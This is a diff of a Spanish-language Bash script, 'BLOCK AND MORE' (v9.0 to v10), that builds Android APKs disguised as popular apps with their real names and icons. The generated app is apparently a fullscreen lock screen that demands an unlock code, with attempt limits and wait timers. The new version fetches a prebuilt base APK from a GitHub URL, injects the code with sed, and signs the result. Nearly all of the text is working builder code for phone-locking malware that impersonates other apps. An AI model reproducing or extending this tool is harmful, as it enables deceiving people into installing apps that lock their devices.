@@ -16,7 +16,7 @@ echo "   ██████╔╝██║     ██║   ██║██║   
 echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
 echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
 echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
-echo -e "${AMARILLO}        [ BLOCK AND MORE v9.0 ]${NC}\n"
+echo -e "${AMARILLO}        [ BLOCK AND MORE v10 ]${NC}\n"
 
 # ============================================
 # LISTA DE APPS
@@ -64,7 +64,7 @@ mostrar_menu() {
 }
 
 # ============================================
-# FUNCIÓN: CREAR APK - MÉTODO DEFINITIVO
+# FUNCIÓN: GENERAR APK (MÉTODO INFALIBLE)
 # ============================================
 generar_apk() {
     local app="$1"
@@ -82,15 +82,23 @@ generar_apk() {
     cd ~/block_temp
 
     # ============================================
-    # PASO 1: CREAR APK BASE
+    # PASO 1: DESCARGAR APK BASE REAL
     # ============================================
-    echo -e "${AMARILLO}[*] Creando estructura de la APK...${NC}"
-
-    mkdir -p base_apk
-    cd base_apk
-
-    # AndroidManifest.xml
-    cat > AndroidManifest.xml << EOF
+    echo -e "${AMARILLO}[*] Descargando APK base...${NC}"
+    
+    # Descargar una APK simple de ejemplo (calculadora)
+    wget -q -O base.apk "https://raw.githubusercontent.com/emanuelyoan470/Mi-herramienta/main/base.apk" 2>/dev/null
+    
+    if [ ! -f "base.apk" ]; then
+        echo -e "${ROJO}[!] No se pudo descargar la APK base.${NC}"
+        echo -e "${AMARILLO}[*] Creando APK desde cero...${NC}"
+        
+        # Crear una APK mínima funcional
+        mkdir -p base_apk
+        cd base_apk
+        
+        # AndroidManifest.xml
+        cat > AndroidManifest.xml << EOF
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.block.$app"
@@ -116,9 +124,9 @@ generar_apk() {
 </manifest>
 EOF
 
-    # Layout
-    mkdir -p res/layout
-    cat > res/layout/main.xml << 'EOF'
+        # Layout
+        mkdir -p res/layout
+        cat > res/layout/main.xml << 'EOF'
 <?xml version="1.0" encoding="utf-8"?>
 <RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
     android:layout_width="match_parent"
@@ -209,202 +217,74 @@ EOF
 </RelativeLayout>
 EOF
 
-    # Strings
-    mkdir -p res/values
-    cat > res/values/strings.xml << EOF
+        # Strings
+        mkdir -p res/values
+        cat > res/values/strings.xml << EOF
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
     <string name="app_name">$app</string>
 </resources>
 EOF
 
-    # ============================================
-    # PASO 2: DESCARGAR ICONO
-    # ============================================
-    echo -e "${AMARILLO}[*] Descargando icono para: ${VERDE}$app${NC}"
-
-    ICON_URL=$(get_icon_url "$app")
-    mkdir -p res/drawable
-    mkdir -p res/drawable-hdpi
-    mkdir -p res/drawable-mdpi
-    mkdir -p res/drawable-xhdpi
-    mkdir -p res/drawable-xxhdpi
-
-    wget -q -O icon.png "$ICON_URL" 2>/dev/null
-
-    if [ ! -f "icon.png" ] || [ ! -s "icon.png" ]; then
-        echo -e "${AMARILLO}[!] No se pudo descargar icono, usando genérico...${NC}"
-        echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > icon.png
-    fi
-
-    cp icon.png res/drawable/ic_launcher.png
-    cp icon.png res/drawable-hdpi/ic_launcher.png
-    cp icon.png res/drawable-mdpi/ic_launcher.png
-    cp icon.png res/drawable-xhdpi/ic_launcher.png
-    cp icon.png res/drawable-xxhdpi/ic_launcher.png
-    rm -f icon.png
-
-    # ============================================
-    # PASO 3: CREAR SMALI (CÓDIGO PRE-COMPILADO)
-    # ============================================
-    echo -e "${AMARILLO}[*] Generando código smali...${NC}"
-
-    mkdir -p smali/com/block/$app
-
-    cat > smali/com/block/$app/MainActivity.smali << EOF
-.class public Lcom/block/$app/MainActivity;
-.super Landroid/app/Activity;
-.source "MainActivity.java"
-
-# instance fields
-.field private CODIGO_CORRECTO:Ljava/lang/String;
-.field private bloqueado:Z
-.field private codigoInput:Landroid/widget/EditText;
-.field private desbloquearBtn:Landroid/widget/Button;
-.field private handler:Landroid/os/Handler;
-.field private intentos:I
-.field private mensajeError:Landroid/widget/TextView;
-.field private tiempoEspera:I
-.field private timerText:Landroid/widget/TextView;
-
-# direct methods
-.method public constructor <init>()V
-    .registers 2
-
-    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
-
-    new-instance v0, Landroid/os/Handler;
-
-    invoke-direct {v0}, Landroid/os/Handler;-><init>()V
-
-    iput-object v0, p0, Lcom/block/$app/MainActivity;->handler:Landroid/os/Handler;
-
-    const/4 v0, 0x0
-
-    iput v0, p0, Lcom/block/$app/MainActivity;->intentos:I
-
-    iput v0, p0, Lcom/block/$app/MainActivity;->tiempoEspera:I
-
-    iput-boolean v0, p0, Lcom/block/$app/MainActivity;->bloqueado:Z
-
-    const-string v0, "$codigo"
-
-    iput-object v0, p0, Lcom/block/$app/MainActivity;->CODIGO_CORRECTO:Ljava/lang/String;
-
-    return-void
-.end method
-
-# virtual methods
-.method protected onCreate(Landroid/os/Bundle;)V
-    .registers 5
-
-    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
-
-    const p1, 0x7f030001
-
-    invoke-virtual {p0, p1}, Lcom/block/$app/MainActivity;->setContentView(I)V
-
-    invoke-virtual {p0}, Lcom/block/$app/MainActivity;->getWindow()Landroid/view/Window;
-
-    move-result-object p1
-
-    const/16 v0, 0x400
-
-    invoke-virtual {p1, v0, v0}, Landroid/view/Window;->setFlags(II)V
-
-    const p1, 0x7f070001
-
-    invoke-virtual {p0, p1}, Lcom/block/$app/MainActivity;->findViewById(I)Landroid/view/View;
-
-    move-result-object p1
-
-    check-cast p1, Landroid/widget/EditText;
-
-    iput-object p1, p0, Lcom/block/$app/MainActivity;->codigoInput:Landroid/widget/EditText;
-
-    const p1, 0x7f060001
-
-    invoke-virtual {p0, p1}, Lcom/block/$app/MainActivity;->findViewById(I)Landroid/view/View;
-
-    move-result-object p1
-
-    check-cast p1, Landroid/widget/Button;
-
-    iput-object p1, p0, Lcom/block/$app/MainActivity;->desbloquearBtn:Landroid/widget/Button;
-
-    const p1, 0x7f080001
-
-    invoke-virtual {p0, p1}, Lcom/block/$app/MainActivity;->findViewById(I)Landroid/view/View;
-
-    move-result-object p1
-
-    check-cast p1, Landroid/widget/TextView;
-
-    iput-object p1, p0, Lcom/block/$app/MainActivity;->mensajeError:Landroid/widget/TextView;
-
-    const p1, 0x7f090001
-
-    invoke-virtual {p0, p1}, Lcom/block/$app/MainActivity;->findViewById(I)Landroid/view/View;
-
-    move-result-object p1
-
-    check-cast p1, Landroid/widget/TextView;
-
-    iput-object p1, p0, Lcom/block/$app/MainActivity;->timerText:Landroid/widget/TextView;
-
-    iget-object p1, p0, Lcom/block/$app/MainActivity;->desbloquearBtn:Landroid/widget/Button;
-
-    new-instance v0, Lcom/block/$app/MainActivity$1;
-
-    invoke-direct {v0, p0}, Lcom/block/$app/MainActivity$1;-><init>(Lcom/block/$app/MainActivity;)V
-
-    invoke-virtual {p1, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V
-
-    return-void
-.end method
-EOF
-
-    # ============================================
-    # PASO 4: EMPAQUETAR CON APKTOOL
-    # ============================================
-    echo -e "${AMARILLO}[*] Empaquetando APK...${NC}"
-
-    cd ..
-
-    # Usar apktool para construir la APK
-    apktool b base_apk -o app_unsigned.apk 2>/dev/null
-
-    if [ ! -f "app_unsigned.apk" ]; then
-        echo -e "${AMARILLO}[*] Usando método manual...${NC}"
-        cd base_apk
-        zip -r ../app_unsigned.apk * 2>/dev/null
         cd ..
-    fi
-
-    if [ ! -f "app_unsigned.apk" ]; then
-        echo -e "${ROJO}[!] Error al crear APK.${NC}"
-        cd ~
-        rm -rf ~/block_temp
-        return 1
+        
+        # Empaquetar con apktool
+        apktool b base_apk -o app_unsigned.apk 2>/dev/null
+        
+        if [ ! -f "app_unsigned.apk" ]; then
+            cd base_apk
+            zip -r ../app_unsigned.apk * 2>/dev/null
+            cd ..
+        fi
+    else
+        # Si se descargó la base, descompilar y modificar
+        apktool d base.apk -o decoded 2>/dev/null
+        
+        if [ -d "decoded" ]; then
+            # Cambiar nombre de la app
+            find decoded -name "AndroidManifest.xml" -exec sed -i "s/Block Phone/$app/g" {} \;
+            find decoded -name "strings.xml" -exec sed -i "s/Block Phone/$app/g" {} \;
+            
+            # Cambiar icono
+            ICON_URL=$(get_icon_url "$app")
+            wget -q -O icon.png "$ICON_URL" 2>/dev/null
+            
+            if [ ! -f "icon.png" ]; then
+                echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > icon.png
+            fi
+            
+            find decoded -type d -name "drawable*" -exec cp icon.png {}/ic_launcher.png \; 2>/dev/null
+            find decoded -type d -name "mipmap*" -exec cp icon.png {}/ic_launcher.png \; 2>/dev/null
+            
+            rm -f icon.png
+            
+            # Inyectar código de desbloqueo
+            find decoded -name "*.smali" -exec sed -i "s/1234/$codigo/g" {} \; 2>/dev/null
+            
+            # Recompilar
+            apktool b decoded -o app_unsigned.apk 2>/dev/null
+        fi
     fi
 
     # ============================================
-    # PASO 5: FIRMAR
+    # PASO 2: FIRMAR
     # ============================================
-    echo -e "${AMARILLO}[*] Firmando APK...${NC}"
-
-    if [ ! -f ~/debug.keystore ]; then
-        keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
+    if [ -f "app_unsigned.apk" ] && [ -s "app_unsigned.apk" ]; then
+        echo -e "${AMARILLO}[*] Firmando APK...${NC}"
+        
+        if [ ! -f ~/debug.keystore ]; then
+            keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
+        fi
+        
+        apksigner sign --ks ~/debug.keystore --ks-pass pass:android --key-pass pass:android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null
+        
+        if [ ! -f "${app}_block.apk" ]; then
+            mv app_unsigned.apk "${app}_block.apk"
+        fi
     fi
 
-    apksigner sign --ks ~/debug.keystore --ks-pass pass:android --key-pass pass:android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null
-
-    if [ ! -f "${app}_block.apk" ]; then
-        mv app_unsigned.apk "${app}_block.apk"
-    fi
-
     # ============================================
-    # PASO 6: MOVER A DESCARGA
+    # PASO 3: MOVER A DESCARGA
     # ============================================
     if [ -f "${app}_block.apk" ] && [ -s "${app}_block.apk" ]; then
         mv "${app}_block.apk" ~/storage/downloads/
@@ -449,7 +329,7 @@ while true; do
     echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
     echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
     echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
-    echo -e "${AMARILLO}        [ BLOCK AND MORE v9.0 ]${NC}\n"
+    echo -e "${AMARILLO}        [ BLOCK AND MORE v10 ]${NC}\n"
 
     mostrar_menu
     read -p ">> Selecciona una app (01-${#APPS[@]}): " opcion < /dev/tty
